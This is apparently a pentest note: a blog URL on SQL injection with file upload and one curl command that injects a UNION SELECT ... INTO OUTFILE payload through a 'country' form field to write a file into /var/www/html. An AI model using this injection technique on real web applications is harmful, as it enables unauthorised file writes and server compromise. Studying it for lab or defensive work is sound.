https://neetech18.blogspot.com/2019/10/sql-injection-with-file-upload.html

```
curl -v -d "username=pencer12&country=Belgium' union select 'pencer testing' into outfile '/var/www/html/pencer.txt';-- - "
```